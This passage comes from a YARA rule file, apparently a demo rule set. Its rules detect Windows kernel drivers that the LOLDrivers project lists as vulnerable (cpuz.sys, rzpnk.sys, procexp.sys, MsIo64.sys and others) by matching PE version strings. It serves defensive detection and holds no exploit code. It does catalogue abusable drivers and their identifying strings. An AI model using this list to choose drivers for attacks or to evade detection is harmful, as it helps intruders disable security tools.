https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005400720065006e0064004d006900630072006f00200043006f006d006d006f006e0020004d006f00640075006c00650020004e006f00540072006100700020004200750069006c0064 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0035002e0030002e0030002e0031003100300034 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0035002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005400720065006e00640020004d006900630072006f00200045007900650073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0054006d0043006f006d006d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300035002d00320030003100310020005400720065006e00640020004d006900630072006f00200049006e0063006f00720070006f00720061007400650064002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Cpuid_Cpuzsys_Cpuidservice_7710_RID388D : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - cpuz.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 18:26:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004300500055004900440020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00430050005500490044 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002e0031002e0037003600300030002e003100360033003800350020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002e0031002e0037003600300030002e00310036003300380035 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006300700075007a002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043005000550049004400200073006500720076006900630065 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]006300700075007a002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400280043002900200032003000310035002000430050005500490044 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Razerinc_Rzpnk_Rzpnk_AD8F_RID364D : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - rzpnk.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 16:50:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00520061007a006500720020004f007600650072006c0061007900200053007500700070006f00720074 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00520061007a00650072002c00200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e00310032002e0039003900380036 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e00310032002e0039003900380036 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0052007a0070006e006b } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0052007a0070006e006b } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0052007a0070006e006b002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310030002d0032003000310034 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them\n}\n\nrule PUA_VULN_Driver_Ludashicom_Computerzsys_71C0_RID378F : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ComputerZ.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:43:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004c007500640061007300680069002000530079007300740065006d0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]006c007500640061007300680069002e0063006f006d } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0036002e00310035002e0031003000340035 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0036002e00310035002e0031003000340035 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]9c8159275e08 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]7248674362406709002000280043002900200032003000310030002d00320030003100350020007700770077002e006c007500640061007300680069002e0063006f006d } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Windowsrserverddkprovider_Speedfansys_Windowsrserverddkdriver_22BE_RID4797 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - speedfan.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 05:07:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0053007000650065006400460061006e00200044006500760069006300650020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000530065007200760065007200200032003000300033002000440044004b002000700072006f00760069006400650072 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0035002e0032002e0033003700390030002e00300020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0035002e0032002e0033003700390030002e0030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0073007000650065006400660061006e002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00570069006e0064006f007700730020002800520029002000530065007200760065007200200032003000300033002000440044004b0020006400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0073007000650065006400660061006e002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]00a90020004d006900630072006f0073006f0066007400200043006f00720070006f0072006100740069006f006e002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Openlibsysorg_Openlibsyssys_Openlibsys_9131_RID3DCF : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - OpenLibSys.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 22:10:21\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004f00700065006e004c00690062005300790073 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004f00700065006e004c00690062005300790073002e006f00720067 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e0032 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e0032 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004f00700065006e004c00690062005300790073002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004f00700065006e004c00690062005300790073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004f00700065006e004c00690062005300790073002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003000370020004f00700065006e004c00690062005300790073002e006f00720067 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Tgsoftsas_Viragtsys_Viritagentsystem_E4EC_RID3D2F : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - viragt64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 21:43:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005600690072004900540020004100670065006e0074002000530079007300740065006d } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0054004700200053006f0066007400200053002e0061002e0073002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002c002000330038002c00200030002c00200030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002c002000330038002c00200030002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]007600690072006100670074002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]005600690072004900540020004100670065006e0074002000530079007300740065006d } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]007600690072006100670074002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200054004700200053006f0066007400200053002e0061002e0073002e00200032003000300036002c002000320030003100310020002d0020007700770077002e007400670073006f00660074002e00690074 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Asustekcomputerinc_Atsziosys_Atsziodriver_FB6B_RID3F4A : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ATSZIO.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 23:13:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004100540053005a0049004f0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004100530055005300540065006b00200043006f006d0070007500740065007200200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0030002e0032002e0032002e0033 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0030002e0032002e0032002e0033 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004100540053005a0049004f002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004100540053005a0049004f0020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004100540053005a0049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000310032 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Sysinternalswwwsysinternalscom_Procexpsys_Processexplorer_075D_RID4634 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - procexp.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:08:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00500072006f00630065007300730020004500780070006c006f007200650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0053007900730069006e007400650072006e0061006c00730020002d0020007700770077002e0073007900730069006e007400650072006e0061006c0073002e0063006f006d } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310036002e00330032 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310036002e00330032 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00700072006f0063006500780070002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00500072006f00630065007300730020004500780070006c006f007200650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00700072006f0063006500780070002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028004300290020004d00610072006b002000520075007300730069006e006f007600690063006800200031003900390036002d0032003000320030 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Micsystechnologycoltd_Msiosys_Msiodriverversion_X_AE42_RID4270 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - MsIo64.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:27:51\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004d0049004300530059005300200049004f0020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d0049004300530059005300200054006500630068006e006f006c006f0067007900200043006f002e002c0020004c00540064 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e003300200078003600340020006200750069006c0074002000620079003a002000570069006e00440044004b } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e00330020007800360034 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004d00730049006f00360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004d00730049006f003600340020004400720069007600650072002000560065007200730069006f006e00200031002e0033 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004d00730049006f00360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800630029002000320030003200310020004d00490043005300590053 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Vektortsecurityservice_Vboxdrv_Antidetectpublic_3724_RID4179 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - VBoxDrv.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 00:46:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]005600690072007400750061006c0042006f007800200053007500700070006f007200740020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]00560065006b0074006f0072002000540031003300200053006500630075007200690074007900200053006500720076006900630065 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0034002e0032002e003100310039003200330030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0034002e0032002e003100310039003200330030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00560042006f0078004400720076 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0041006e00740069006400650074006500630074002000320030003100390020005000750062006c00690063 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00560042006f0078004400720076002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000280043002900200032003000300039002d00320030003100390020004f007200610063006c006500200043006f00720070006f0072006100740069006f006e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of them\n}\n\nrule PUA_VULN_Driver_Elaboratebytesag_Elbycdio_Cdrtools_2380_RID3BA2 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - elbycdio.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 20:37:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]0045006c0062007900430044002000570069006e0064006f00770073002000780036003400200049002f004f0020006400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0036002c00200030002c00200033002c00200032 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0036002c00200030002c00200030002c00200030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0045006c00620079004300440049004f } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]0043004400520054006f006f006c0073 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0045006c00620079004300440049004f002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003000300020002d0020003200300030003900200045006c00610062006f0072006100740065002000420079007400650073002000410047 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Nvidiacorp_Nvoclocksys_Nvidiasystemutilitydriver_D7C9_RID4226 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - nvoclock.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 01:15:31\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e00560069006400690061002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004e0056006900640069006100200043006f00720070002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002c002000300030002c002000300030002c002000300030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002c00200030002c00200030002c00200031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]006e0076006f0063006c006f0063006b002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e00560069006400690061002000530079007300740065006d0020005500740069006c0069007400790020004400720069007600650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004e0056006f0063006c006f0063006b002e00520043 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f0070007900720069006700680074002000a900200032003000300033 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Cn_Computerzsys_A97B_RID344F : CHINA DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - ComputerZ.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 15:25:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"CHINA, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004c007500640061007300680069002000530079007300740065006d0020004400720069007600650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]003300360030002e0063006e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0036002e00310031002e0031003000300038 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0036002e00310031002e0031003000300038 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]003300360030786c4ef659275e08 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0043006f006d00700075007400650072005a002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]7248674362406709002000280043002900200032003000310030002d00320030003100310020003300360030002e0063006e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Msi_Ntiolibxsys_Ntiolibx_1E8B_RID37EC : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - NTIOLib.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 17:59:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]004e00540049004f004c00690062005f005800360034 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004d00530049 } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]0031002e0030002e0030002e0031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]0031002e0030002e0030002e0031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]004e00540049004f004c00690062005f005800360034002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]004e00540049004f004c00690062005f005800360034 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]004e00540049004f004c00690062005f005800360034002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003100340020004d00530049002e00200041006c006c0020007200690067006800740073002000720065007300650072007600650064002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Featureintegrationtechnologyinc_Fintekpciecom_81FB_RID409B : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - FPCIE2COM.sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 00:09:41\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00460049004e00540045004b002000500043004900450043004f004d00200041006400610070007400650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]004600650061007400750072006500200049006e0074006500670072006100740069006f006e00200054006500630068006e006f006c006f0067007900200049006e0063002e } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00320032002c00310032002c0035002c0030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00320032002c00310032002c0035002c0030 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00460049004e00540045004b002000500043004900450043004f004d0020 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]0046005000430049004500320043004f004d002e007300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f00700079007200690067006800740020002800430029002000320030003200320020004600650061007400750072006500200049006e0074006500670072006100740069006f006e00200054006500630068006e006f006c006f0067007900200049006e0063002e } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Sysinternalswwwsysinternalscom_Procexpsys_Processexplorer_6BFC_RID4655 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - procexp.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:14:01\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00500072006f00630065007300730020004500780070006c006f007200650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0053007900730069006e007400650072006e0061006c00730020002d0020007700770077002e0073007900730069006e007400650072006e0061006c0073002e0063006f006d } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310035002e00300030 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310035002e00300030 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00700072006f0063006500780070002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00500072006f00630065007300730020004500780070006c006f007200650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00700072006f0063006500780070002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028004300290020004d002e002000520075007300730069006e006f007600690063006800200031003900390036002d0032003000310031 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule PUA_VULN_Driver_Sysinternalswwwsysinternalscom_Procexpsys_Processexplorer_7A48_RID4638 : DEMO EXE FILE {\n   meta:\n      description = \"Detects vulnerable driver mentioned in LOLDrivers project using VersionInfo values from the PE header - procexp.Sys\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/magicsword-io/LOLDrivers\"\n      date = \"2024-08-07 04:09:11\"\n      score = 40\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $ = { 00460069006c0065004400650073006300720069007000740069006f006e[1-8]00500072006f00630065007300730020004500780070006c006f007200650072 } \n      $ = { 0043006f006d00700061006e0079004e0061006d0065[1-8]0053007900730069006e007400650072006e0061006c00730020002d0020007700770077002e0073007900730069006e007400650072006e0061006c0073002e0063006f006d } \n      $ = { 00460069006c006500560065007200730069006f006e[1-8]00310036002e00340031 } \n      $ = { 00500072006f006400750063007400560065007200730069006f006e[1-8]00310036002e00340031 } \n      $ = { 0049006e007400650072006e0061006c004e0061006d0065[1-8]00700072006f0063006500780070002e007300790073 } \n      $ = { 00500072006f0064007500630074004e0061006d0065[1-8]00500072006f00630065007300730020004500780070006c006f007200650072 } \n      $ = { 004f0072006900670069006e0061006c00460069006c0065006e0061006d0065[1-8]00700072006f0063006500780070002e005300790073 } \n      $ = { 004c006500670061006c0043006f0070007900720069006700680074[1-8]0043006f007000790072006900670068007400200028004300290020004d00610072006b002000520075007300730069006e006f007600690063006800200031003900390036002d0032003000320031 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and all of 